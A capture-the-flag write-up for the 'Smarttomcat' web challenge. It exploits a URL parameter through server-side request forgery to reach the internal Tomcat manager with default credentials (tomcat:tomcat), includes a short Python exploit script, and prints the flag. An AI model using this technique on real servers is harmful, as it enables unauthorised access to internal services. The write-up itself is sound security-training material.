# Smarttomcat (Web 50)
Author: avarx



>Normal, regular cats are so 2000 and late, I decided to buy this allegedly smart tomcat robot
Now the damn thing has attacked me and flew away. I can't even seem to track it down on the broken search interface... Can you help me ?

![website](/images/INST17/INST17_website.png "website")

We can submit coordinates to find the cat.
If we check the source code we can see that a **POST** is done to **index.php** with **localhost:8080** and a **jsp** file as **u-parameter**.

![source](/images/INST17/INST17_source.png "source")


Together with the task title we assume it's a **tomcat**.
Tomcat's got that [**manager**](https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html). Let's try **standard credentials**:


```
#!/usr/bin/env python

import requests
import re

TARGET_URL = 'http://smarttomcat.teaser.insomnihack.ch/'
TOMCAT_USER = 'tomcat'
TOMCAT_PASS = 'tomcat'
PAYLOAD = "http://"+TOMCAT_USER+":"+TOMCAT_PASS+"@localhost:8080/manager/html"

answer = requests.post(TARGET_URL, data={'u':PAYLOAD})
flag = re.findall(r"(INS\{...+\})", answer.text)

print(flag[0])
```
**INS{th1s_is_re4l_w0rld_pent3st}**

created by xel/grimmlin

